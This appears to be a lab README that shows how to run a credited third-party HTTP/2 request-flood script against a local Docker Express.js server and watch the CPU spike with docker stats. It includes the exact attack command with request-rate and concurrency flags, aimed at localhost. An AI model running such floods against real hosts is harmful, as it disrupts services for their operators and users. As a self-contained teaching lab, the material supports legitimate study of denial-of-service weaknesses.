# HTTP/2 DDoS Attack

This attack utilizes the attack script from [bennettaur's http2-ddos](https://github.com/bennettaur/http2-ddos)! Huge shout to Michael Bennett for his great work and [presentation](https://www.youtube.com/watch?v=10UFK9KIXIQ) at HackFest.

## Set up the HTTP/2 Server

```
docker pull robinhung/http2-express-server

docker run -p 9876:3000 -d robinhung/http2-express-server
```

Now go to **https://localhost:9876** to connect to HTTP/2 express.js server.

NOTICE: use **https** instead of http! Normally the browser will indicates that the connection is insecure. This is becasue we're utilizing the _self-signed certificate_ ,which is not trusted by the browser. Just add the exception to view the page :)

## Attack Setup

Head over to `attack-script` directory. After you can utilize the .py script to launch the attack, you need to setup the virtualenv and install all the required packages!

### Setup virtual environment using _virtualenv_

```
virtualenv --python python2 env2

# activate the virtual environment
source env2/bin/activate

# test if the virtualenv has been successfully setup
pip list

pip install -r requirements.txt
```

### Attack Time!

Now, let's launch the attack!

```
# use the `http_req_limit_tests.pt` to spam the server with `/` requests
python http2_req_limit_tests.py -r 200 -c 10 -t localhost -p 9876 -f ./assets.txt -v 2
```

Click `Control + C` to stop the attack script.

During the attack, you can use `docker stats` to view the CPU usage has been increased dramatically!

```
docker stats $(docker ps | awk '{if(NR>1) print $NF}')
```
